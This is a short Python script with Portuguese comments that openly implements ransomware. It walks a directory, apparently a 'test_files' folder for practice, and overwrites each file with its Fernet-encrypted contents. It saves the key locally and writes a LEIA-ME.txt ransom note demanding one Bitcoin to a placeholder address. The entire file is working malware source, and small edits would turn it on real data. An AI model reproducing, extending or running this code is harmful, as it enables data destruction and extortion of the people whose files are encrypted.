from cryptography.fernet import Fernet
import os

#1. gerar uma chave de criptografia

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2. carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3. criptografar un único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4. encontrar quivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("LEIA-ME.txt", "w") as f:
        f.write("Seus arquivos foram criptografados.")
        f.write(" Para recuperá-los, envie 1 Bitcoin para o endereço XXXXXX.")
        f.write("Depois disso, enviaremos a chave de descriptografia.")

#6. execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado! Arquivos Criptografos!")

if __name__ == "__main__":
    main()



    